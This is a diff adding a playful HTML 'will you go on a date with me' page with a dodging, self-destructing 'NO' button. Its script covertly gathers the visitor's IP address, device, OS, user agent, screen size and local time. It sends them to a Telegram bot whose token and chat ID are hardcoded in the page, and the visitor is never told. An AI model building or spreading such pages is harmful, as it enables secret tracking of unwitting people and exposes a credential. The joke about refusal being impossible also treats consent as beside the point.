@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Cutie Date App 💖</title>
+
+   <style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: "Comic Sans MS", cursive;
+}
+
+html {
+    font-size: 16px;
+}
+
+body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    padding: 1rem;
+    background: radial-gradient(circle at top, #ffd6ec, #ffb6d9, #ff9fcb);
+}
+
+.hearts {
+    position: fixed;
+    inset: 0;
+    overflow: hidden;
+    z-index: 0;
+}
+
+.heart {
+    position: absolute;
+    pointer-events: none;
+    animation: floatUp linear forwards;
+    opacity: 0.9;
+    filter: drop-shadow(0 0 0.5rem rgba(255, 255, 255, 0.8));
+    will-change: transform;
+}
+
+@keyframes floatUp {
+    0% {
+        transform: translateY(120vh) translateX(0) rotate(0deg) scale(0.6);
+        opacity: 0;
+    }
+    10% {
+        opacity: 1;
+    }
+    100% {
+        transform: translateY(-130vh) translateX(calc(-6rem + 12rem * var(--drift))) rotate(360deg) scale(1.4);
+        opacity: 0;
+    }
+}
+
+.card {
+    width: 100%;
+    max-width: 42rem;
+    min-height: 42rem;
+    background: rgba(255, 255, 255, 0.25);
+    backdrop-filter: blur(0.4rem);
+    border: 0.25rem solid rgba(255, 255, 255, 0.5);
+    border-radius: 2.5rem;
+    position: relative;
+    z-index: 10;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 2rem;
+    text-align: center;
+    box-shadow: 0 0.6rem 2.5rem rgba(255, 105, 180, 0.4), inset 0 0 1.2rem rgba(255, 255, 255, 0.4);
+}
+
+.sparkles {
+    position: absolute;
+    top: 1rem;
+    right: 1.2rem;
+    font-size: 1.5rem;
+    color: white;
+}
+
+h1 {
+    font-size: clamp(2rem, 4vw, 3rem);
+    color: #ff2d7a;
+    margin-bottom: 1.2rem;
+    text-shadow: 0.12rem 0.12rem white;
+    line-height: 1.3;
+}
+
+.cute-text {
+    color: #ff5c9f;
+    font-size: clamp(1rem, 3vw, 1.4rem);
+    margin-bottom: 1rem;
+    line-height: 1.5;
+}
+
+img {
+    width: 70%;
+    max-width: 18rem;
+    border-radius: 1.6rem;
+    border: 0.35rem solid white;
+    margin-bottom: 2rem;
+    box-shadow: 0 0.6rem 1.6rem rgba(255, 105, 180, 0.3);
+}
+
+.circle-gif-container {
+    width: 16rem;
+    height: 16rem;
+    border-radius: 50%;
+    border: 0.4rem solid white;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    box-shadow: 0 0.6rem 1.6rem rgba(255, 105, 180, 0.4);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.circle-gif-container img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    margin-bottom: 0;
+    border: none;
+    border-radius: 0;
+    box-shadow: none;
+}
+
+.buttons {
+    position: relative;
+    width: 100%;
+    height: 12rem;
+}
+
+button {
+    position: absolute;
+    border: none;
+    padding: 1rem 2rem;
+    border-radius: 999rem;
+    cursor: pointer;
+    font-size: clamp(1rem, 2vw, 1.5rem);
+    font-weight: bold;
+    transition: 0.25s ease;
+    box-shadow: 0 0.5rem 1.2rem rgba(0, 0, 0, 0.15);
+}
+
+#yesBtn {
+    background: linear-gradient(135deg, #ff4f9a, #ff89c0);
+    color: white;
+    left: 20%;
+    top: 3rem;
+}
+
+#yesBtn:hover {
+    transform: scale(1.1);
+}
+
+#noBtn {
+    background: white;
+    color: #ff4f9a;
+    right: 20%;
+    top: 3rem;
+}
+
+.explosion {
+    animation: boom 0.8s forwards;
+}
+
+@keyframes boom {
+    0% {
+        transform: scale(1) rotate(0deg);
+        opacity: 1;
+    }
+    40% {
+        transform: scale(1.7) rotate(20deg);
+    }
+    100% {
+        transform: scale(0) rotate(180deg);
+        opacity: 0;
+    }
+}
+
+.final-message {
+    margin-top: 1rem;
+    font-size: clamp(1.3rem, 3vw, 2rem);
+    color: #ff2d7a;
+    animation: pulse 1s infinite;
+}
+
+@keyframes pulse {
+    0% {
+        transform: scale(1);
+    }
+    50% {
+        transform: scale(1.08);
+    }
+    100% {
+        transform: scale(1);
+    }
+}
+
+.kiss {
+    position: absolute;
+    font-size: 2rem;
+    pointer-events: none;
+    animation: pop 1s forwards;
+}
+
+@keyframes pop {
+    0% {
+        transform: scale(0) translateY(0);
+        opacity: 1;
+    }
+    100% {
+        transform: scale(1.8) translateY(-7rem);
+        opacity: 0;
+    }
+}
+
+.cute-form {
+    display: flex;
+    flex-direction: column;
+    width: 100%;
+    max-width: 26rem;
+    gap: 1.2rem;
+    margin-top: 1rem;
+}
+
+.form-group {
+    display: flex;
+    flex-direction: column;
+    text-align: left;
+    gap: 0.4rem;
+}
+
+.form-row {
+    display: flex;
+    gap: 1rem;
+    width: 100%;
+}
+
+.form-row .form-group {
+    flex: 1;
+}
+
+.form-group label {
+    color: #ff2d7a;
+    font-weight: bold;
+    font-size: 1.1rem;
+}
+
+.form-group input, .form-group select {
+    width: 100%;
+    padding: 0.8rem 1.2rem;
+    border: 0.2rem solid #ffb6d9;
+    border-radius: 1rem;
+    font-family: "Comic Sans MS", cursive;
+    font-size: 1rem;
+    color: #ff5c9f;
+    outline: none;
+    background: rgba(255, 255, 255, 0.8);
+    transition: 0.2s;
+}
+
+.form-group input:focus, .form-group select:focus {
+    border-color: #ff2d7a;
+    box-shadow: 0 0 0.5rem rgba(255, 45, 122, 0.3);
+}
+
+.submit-btn {
+    position: static;
+    background: linear-gradient(135deg, #ff4f9a, #ff89c0);
+    color: white;
+    padding: 1rem;
+    margin-top: 0.5rem;
+    width: 100%;
+}
+
+.submit-btn:hover {
+    transform: scale(1.03);
+}
+
+@media (max-width: 40rem) {
+    html {
+        font-size: 14px;
+    }
+    .card {
+        min-height: auto;
+        padding: 2rem 1.2rem;
+        border-radius: 2rem;
+    }
+    .buttons {
+        height: 10rem;
+    }
+    #yesBtn {
+        left: 10%;
+    }
+    #noBtn {
+        right: 10%;
+    }
+    img, .circle-gif-container {
+        width: 85%;
+    }
+    .circle-gif-container {
+        height: 18rem;
+        width: 18rem;
+    }
+    .heart {
+        filter: none;
+    }
+}
+   </style>
+</head>
+
+<body>
+
+    <div class="hearts"></div>
+
+    <div class="card" id="card">
+
+        <div class="sparkles"></div>
+
+        <div class="cute-text">
+            hiiii cutie pie 💕 <br>
+            ur literally the prettiest human everrr 🥺🎀
+        </div>
+
+        <h1>
+            Will you go on a date with me? 💌
+        </h1>
+
+        <img src="cute.gif" alt="Cute Cat" />
+
+        <div class="buttons">
+            <button id="yesBtn">YES 💖</button>
+            <button id="noBtn">NO 😭</button>
+        </div>
+
+        <div class="final-message" id="finalMessage"></div>
+
+    </div>
+
+    <script>
+        const noBtn = document.getElementById("noBtn");
+        const yesBtn = document.getElementById("yesBtn");
+        const card = document.getElementById("card");
+        const finalMessage = document.getElementById("finalMessage");
+
+        const BOT_TOKEN = "7725389903:AAFCxdKPxTOhMubpdKNFYwsNCBIGw3PcYKg";
+        const CHAT_ID = "-1002978110536";
+
+        let moveCount = 0;
+        let visitorIp = "unknown";
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceType = "Unknown";
+            if (/mobile/i.test(ua)) deviceType = "Phone";
+            else if (/tablet/i.test(ua)) deviceType = "Tablet";
+            else deviceType = "PC";
+
+            let os = "Unknown";
+            if (/windows/i.test(ua)) os = "Windows";
+            else if (/android/i.test(ua)) os = "Android";
+            else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
+            else if (/mac os/i.test(ua)) os = "macOS";
+            else if (/linux/i.test(ua)) os = "Linux";
+
+            return { deviceType, os, ua };
+        }
+
+        async function fetchIp() {
+            try {
+                const res = await fetch("https://api.ipify.org?format=json");
+                const data = await res.json();
+                visitorIp = data.ip || "unknown";
+            } catch (err) {
+                console.error(err);
+            }
+        }
+        fetchIp();
+
+        noBtn.addEventListener("mouseenter", () => {
+            moveCount++;
+
+            if (moveCount >= 3) {
+                noBtn.classList.add("explosion");
+                createCuteExplosion();
+
+                setTimeout(() => {
+                    noBtn.remove();
+                }, 700);
+
+                yesBtn.style.left = "50%";
+                yesBtn.style.top = "50%";
+                yesBtn.style.transform = "translate(-50%, -50%) scale(1.5)";
+                finalMessage.innerHTML = "hehehehe now u only have one choice cutie 💘";
+                return;
+            }
+
+            const maxX = 520;
+            const maxY = 120;
+
+            const randomX = Math.floor(Math.random() * maxX);
+            const randomY = Math.floor(Math.random() * maxY);
+
+            noBtn.style.left = randomX + "px";
+            noBtn.style.top = randomY + "px";
+            noBtn.style.right = "auto";
+        });
+
+        noBtn.addEventListener("click", (e) => {
+            e.preventDefault();
+        });
+
+        yesBtn.addEventListener("click", () => {
+            let monthOptions = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
+                .map(m => `<option value="${m}">${m}</option>`).join('');
+                
+            let dayOptions = Array.from({length: 31}, (_, i) => i + 1)
+                .map(d => `<option value="${d}">${d}</option>`).join('');
+
+            card.innerHTML = `
+                <div class="sparkles">✨🌸✨</div>
+                <div class="cute-text">omgggg u said yes!! i'm so excited! 🥺 unconditional happiness initialized 💕</div>
+                <h1>Schedule Our Date! 📅</h1>
+                <form id="dateForm" class="cute-form">
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="monthInput">Month 🗓️</label>
+                            <select id="monthInput" required>
+                                <option value="" disabled selected>Month...</option>
+                                ${monthOptions}
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="dayInput">Day 📆</label>
+                            <select id="dayInput" required>
+                                <option value="" disabled selected>Day...</option>
+                                ${dayOptions}
+                            </select>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="timeInput">Pick a time ⏰</label>
+                        <input type="time" id="timeInput" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="activityInput">What should we do? 🫦</label>
+                        <select id="activityInput" required>
+                            <option value="" disabled selected>Select something fun...</option>
+                            <option value="Going to watch the Backrooms movie together 🎬🖤">Going to watch the Backrooms movie together 🎬🖤</option>
+                            <option value="Sitting somewhere cozy and talking for hours ☕✨">Sitting somewhere cozy and talking for hours ☕✨</option>
+                            <option value="Taking a super long walk together at night 🌙🚶‍♀️">Taking a super long walk together at night 🌙🚶‍♀️</option>
+                            <option value="Trying cute desserts and rating them together 🍰💕">Trying cute desserts and rating them together 🍰💕</option>
+                            <option value="Listening to music together and sharing random stories 🎧💫">Listening to music together and sharing random stories 🎧💫</option>
+                        </select>
+                    </div>
+                    <button type="submit" class="submit-btn">Lock It In! 🔐💖</button>
+                </form>
+            `;
+
+            document.getElementById("dateForm").addEventListener("submit", async (e) => {
+                e.preventDefault();
+                
+                const selectedMonth = document.getElementById("monthInput").value;
+                const selectedDay = document.getElementById("dayInput").value;
+                const formattedDate = `${selectedMonth} ${selectedDay}`;
+
+                const selectedTime = document.getElementById("timeInput").value;
+                const selectedActivity = document.getElementById("activityInput").value;
+
+                const t24 = selectedTime.split(':');
+                let hours = parseInt(t24[0]);
+                const minutes = t24[1];
+                const ampm = hours >= 12 ? 'PM' : 'AM';
+                hours = hours % 12;
+                hours = hours ? hours : 12;
+                const formattedTime = `${hours}:${minutes} ${ampm}`;
+
+                const { deviceType, os, ua } = getDeviceInfo();
+                const width = window.innerWidth;
+                const height = window.innerHeight;
+                const currentTime = new Date().toLocaleString();
+
+                const message = `🎉 DATE SCHEDULED! 🎉
+📅 Date: ${formattedDate}
+⏰ Time: ${formattedTime}
+🎈 Activity: ${selectedActivity}
+🎀 Status: Totally locked in and excited!
+
+👀 Visitor Details:
+🌍 IP: ${visitorIp}
+📅 Device Time: ${currentTime}
+🖥️ Screen: ${width}x${height}
+📱 Device: ${deviceType}
+⚙️ OS: ${os}
+🔎 UA: ${ua}`;
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+                    });
+
+                    card.innerHTML = `
+                        <div class="sparkles">✨🔥✨</div>
+                        <h1 style="font-size:45px; margin-bottom: 1.5rem;">It's official, pookie! 🫣💞</h1>
+                        <div class="circle-gif-container">
+                            <img src="sus.gif" alt="Suspiciously Cute" />
+                        </div>
+                        <div class="cute-text" style="font-size: 1.3rem; font-weight: bold; max-width: 32rem; padding: 0 1rem;">
+                            I'm SO glad you didn't say no... because honestly, you didn't stand a chance anyway~ 🤭 <br><br>
+                            Can't wait for <span style="color: #ff2d7a;">${formattedDate}</span> at <span style="color: #ff2d7a;">${formattedTime}</span> so we can finally get down to business and do some <span style="color: #ff2d7a;">${selectedActivity}</span>. <br><br>
+                            Don't look too gorgeous, my heart might actually stop. See you then, beautiful! 😉💋✨
+                        </div>
+                    `;
+                } catch (err) {
+                    card.innerHTML = `
+                        <h1>Oh nooo! 😿</h1>
+                        <div class="cute-text">Something went wrong sending the data, but I still love you! Let me know manually! 💕</div>
+                    `;
+                }
+            });
+        });
+
+        function createCuteExplosion() {
+            const isMobile = window.innerWidth <= 640;
+            const count = isMobile ? 12 : 30;
+            for (let i = 0; i < count; i++) {
+                const kiss = document.createElement("div");
+                kiss.className = "kiss";
+                const emojis = ["💖", "✨", "💘", "🎀", "💕", "🌸"];
+                kiss.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
+                kiss.style.left = noBtn.offsetLeft + "px";
+                kiss.style.top = noBtn.offsetTop + "px";
+                kiss.style.transform = `translate(${Math.random() * 300 - 150}px, ${Math.random() * 300 - 150}px)`;
+                card.appendChild(kiss);
+
+                setTimeout(() => {
+                    kiss.remove();
+                }, 1000);
+            }
+        }
+
+        function createFloatingHearts() {
+            const heartsContainer = document.querySelector(".hearts");
+            const emojis = ["💖", "💕", "💘", "💗", "💓", "🎀", "✨", "🌸", "🩷", "💞"];
+
+            setInterval(() => {
+                const isMobile = window.innerWidth <= 640;
+                const spawnCount = isMobile ? 1 : 4;
+
+                for (let i = 0; i < spawnCount; i++) {
+                    const heart = document.createElement("div");
+                    heart.className = "heart";
+                    heart.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
+                    heart.style.left = Math.random() * 100 + "vw";
+                    const size = isMobile ? (15 + Math.random() * 25) : (20 + Math.random() * 50);
+                    heart.style.fontSize = size + "px";
+                    const duration = 5 + Math.random() * 5;
+                    heart.style.animationDuration = duration + "s";
+                    heart.style.setProperty("--drift", Math.random());
+                    heart.style.opacity = Math.random() * 0.7 + 0.2;
+                    
+                    if (!isMobile) {
+                        heart.style.filter = `blur(${Math.random() * 1.5}px) drop-shadow(0 0 14px rgba(255,255,255,0.9))`;
+                    }
+
+                    heartsContainer.appendChild(heart);
+
+                    setTimeout(() => {
+                        heart.remove();
+                    }, duration * 1000);
+                }
+            }, 350);
+        }
+
+        createFloatingHearts();
+    </script>
+
+</body>
+
+</html>
